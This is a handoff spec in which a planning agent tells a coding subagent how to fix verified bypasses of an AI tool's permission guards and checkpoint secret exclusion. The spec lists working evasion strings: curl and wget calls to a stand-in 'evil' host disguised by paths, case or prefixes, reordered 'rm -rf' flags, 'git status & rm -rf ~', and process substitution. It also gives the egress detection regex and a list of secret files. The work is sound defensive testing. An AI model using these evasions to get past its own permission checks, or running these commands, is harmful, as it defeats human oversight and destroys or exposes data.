# Handoff Spec — Batched Security Fixes (D1/D2/D3/D4)

**For:** implementing subagent (Sonnet). **Author:** planning agent.
**Origin:** adversarial verification pass 2026-07-29 found 3 of 4 permission
controls BROKEN. Full findings and fix directions are in
`docs/security-spec.md` (§ Known Defects D1–D4). READ THAT FIRST.

## Prime directives
- **Security-critical code.** Correctness over cleverness. Each fix must be
  accompanied by a **regression test that fails against the current code and
  passes after your fix** — the test pins the exact evasion, not the happy path.
- **Two files only:** `src/permissions/engine.ts` (D1/D2/D3) and
  `src/checkpoints/index.ts` (D4), plus their test files
  (`src/permissions/engine.test.ts`, `src/checkpoints/security.test.ts`).
  No unrelated refactors. Match existing style.
- **Verify gates:** `npx tsc --noEmit` clean AND `npm test` all green (baseline
  101). Report exact numbers. Do NOT commit — owner runs `/commit`.
- If a fix would over-block legitimate commands, note the tradeoff; prefer
  fail-safe (`ask`) over fail-open (`allow`), but don't make the tool unusable.

---

## FIX 1 — D3: Guarded-pattern regex evasion (HIGHEST PRIORITY)

**File:** `src/permissions/engine.ts`. `GUARDED_PATTERNS` array (~line 14),
`isGuarded()` (~line 195).

**Problem (verified):** network-egress guard `^(curl|wget|nc|ssh|scp|ftp|sftp|telnet|rsync|nmap)\b`
and the `.env` suffix guard `\.env[.\w]*$` match raw string prefixes with
anchored, case-sensitive regexes. These ALL resolve to silent `allow` in `all`
mode and must resolve to `ask`:

- `/usr/bin/curl http://evil/x`  (absolute path defeats `^`)
- `/usr/local/bin/wget http://evil/x`
- `CURL http://evil/x`, `Curl http://evil/x`  (case)
- `"   curl http://evil/x"`  (leading whitespace)
- `FOO=bar curl http://evil/x`  (env-var prefix)
- `\curl http://evil/x`, `command curl http://evil/x`  (escape/builtin prefix)
- `echo http://evil | xargs curl`  (indirection — `curl` not segment-initial)
- `rm -fr /`, `rm -r -f /`  (flag reordering/splitting; current pattern needs r-then-f in one token)
- `read_file` path `".env "`  (trailing space defeats `$`)

**What already works (do NOT break):** the `.ssh/`, `.aws/`, and `sudo` guards
use **unanchored substring** matching and survived every evasion. Use them as
the model — the correct pattern is already in this file.

**Fix approach (for the network-egress + `rm -rf` + `.env`-suffix guards):**
1. **Normalize before matching.** For `run_bash`: work token-by-token. Strip
   leading env-assignment tokens (`FOO=bar`), strip a leading `\`, and skip
   builtin wrappers (`command`, `builtin`, `exec`). Resolve the invoked command
   to its **basename** (`/usr/bin/curl` → `curl`).
2. **Match unanchored + case-insensitive** on the resolved basename against the
   guarded command set. A guarded name appearing as ANY command token (including
   after `xargs`/`sudo`/`command`, or as the target of `xargs`) → guarded.
   Simplest robust rule: if any token's basename (case-folded) is in the
   egress set, it's guarded.
3. **`rm -rf`:** match `rm` invoked with recursive+force in any flag arrangement
   — `-rf`, `-fr`, `-r -f`, `-f -r`, `--recursive --force`, `--force --recursive`,
   and combined-with-others (`-rfv`). Recursive alone (`rm -r`) is already
   dangerous enough to guard per the existing intent; keep `--recursive` guarded.
4. **`.env` / secret paths (read_file AND the `cat …` bash guards):** normalize
   the path first — **trim trailing/leading whitespace**, expand a leading `~`,
   then match. Keep the existing unanchored `.ssh/`/`.aws/` directory matches.
   For the suffix guards (`.env`, `.pem`, `id_rsa`, `credentials.*`), match on the
   normalized basename so a trailing space or a path prefix can't dodge it.

**Tests (engine.test.ts):** add cases asserting `ask` in `all` mode for every
bullet in "Problem" above, AND assert the existing legit cases still resolve
correctly (a plain `curl` with an explicit `allow curl *` rule still allows;
`sudo -i` still asks; a normal `rm file.txt` still allowed). Include one test
that a guarded name inside a chain segment is still caught (`echo hi; /usr/bin/curl evil`).

**Known limitation to document in a code comment (do NOT try to fully solve):**
runtime shell expansion of variables (`cat $AWS_DIR/credentials`) is invisible to
static matching. That's an inherent limit of pre-execution inspection; note it,
don't chase it.

---

## FIX 2 — D2: Command-chain operators missed (HIGH PRIORITY)

**File:** `src/permissions/engine.ts`. `CHAIN_OPERATORS` (~line 31),
`hasSubshell()` (~line 40).

**Problem (verified):** these resolve to `allow` against a `git *` allow rule and
must resolve to `ask`:
- `git status & rm -rf ~`  — single `&` (background) not in `CHAIN_OPERATORS`
- `git log <(rm -rf ~)`  — process substitution `<(` not in `hasSubshell`
- `git log >(rm -rf ~)`  — process substitution `>(`

**Fix:**
1. Add single `&` to the chain split — but do NOT re-split `&&` (already handled).
   Split on a `&` that is not part of `&&`. Verify `&&` still splits as one op.
2. Add `<(` and `>(` to `hasSubshell` (which forces `ask`). So `hasSubshell`
   returns true for `$(`, backticks, `<(`, `>(`.

**Tests:** assert `ask` for the three inputs above against a `git *` allow rule.
Assert `git log | head` with both `git *` and `head *` allowed still resolves
`allow` (don't over-split). Assert `git a && git b` (both allowed) still allows.

---

## FIX 3 — D4: Checkpoint has no secret backstop (HIGH PRIORITY)

**File:** `src/checkpoints/index.ts`. The `exclude` array (~line 34) appended to
the shadow repo's `.git/info/exclude` (~line 46). Shadow ops use
`--work-tree`/`--git-dir` (~line 57) and `git add -A` (~line 82).

**Problem (verified):** the shadow repo relies entirely on the workspace
`.gitignore`. A workspace with NO `.gitignore` commits `.env` into the shadow
repo (`git ls-files` returns `.env`). There is no heirloom-side backstop.

**Fix:** extend the `exclude` array (already written to `info/exclude`) with a
secret-adjacent set that is ALWAYS excluded regardless of the workspace
`.gitignore`:
```
.env, .env.*, *.pem, *.key, id_rsa, id_rsa.*, id_dsa*, id_ecdsa*, id_ed25519*,
credentials.yaml, credentials.json, .aws/**, .ssh/**, *.p12, *.pfx
```
(Match git-exclude glob syntax. `info/exclude` uses gitignore semantics, so
`.env` and `.env.*` and directory globs work.) This is defense-in-depth: the
workspace `.gitignore` still applies on top; heirloom's own exclude is the
floor.

**Test (security.test.ts):** the key MISSING case — a workspace with **NO
`.gitignore` at all** containing a `.env` file → checkpoint → assert `.env` is
**absent** from the shadow repo (`git ls-files` in the shadow repo does not
list it). This currently fails; must pass after the fix. Keep the existing
gitignore-forwarding tests.

**Caveat to preserve:** this reduces but does not eliminate T3 — session
transcripts are still plaintext (redaction is separate, 20.2). Don't claim the
checkpoint is now "secret-safe"; it's "secret-adjacent files excluded by default."

---

## FIX 4 — D1: Dangling-symlink hardening (LOW PRIORITY, defense-in-depth)

**File:** `src/permissions/engine.ts`. `realpathUpToExisting()` (~line 44).

**Problem (verified, NON-exploitable):** a dangling symlink (target doesn't
exist) is misclassified as inside the workspace because `existsSync` skips the
broken-link component. Not a live escape — the OS refuses writes through a broken
symlink (`ENOENT`) — but it's a latent logic flaw.

**Fix:** when walking up to the nearest existing ancestor, detect a symlink
component independent of its target's existence (`lstatSync(...).isSymbolicLink()`).
If a path component is a symlink whose target doesn't resolve inside the
workspace, treat the path as outside. Keep the not-yet-created-file allowance for
ordinary (non-symlink) new paths — don't regress D1's PASS cases.

**Test:** dangling symlink inside workspace pointing at a nonexistent outside
target, requesting a new file under it → must NOT be classified inside (assert
`ask`, not `allow`). Assert all existing D1 PASS cases still pass (legit new
file in new subdir → allow; symlinked workspace root → allow).

---

## Deliverables
1. Diffs for `engine.ts` + `checkpoints/index.ts` + both test files.
2. `npx tsc --noEmit` result; `npm test` count (must exceed 101 by the number of
   new tests, all green).
3. For each of D3/D2/D4/D1: confirm the new regression test FAILS on the
   pre-fix code (state how you verified — e.g. temporarily reverting the fix, or
   reasoning why it must fail) and PASSES after.
4. A note on any legitimate command your D3 normalization might now over-block.
Do NOT commit.
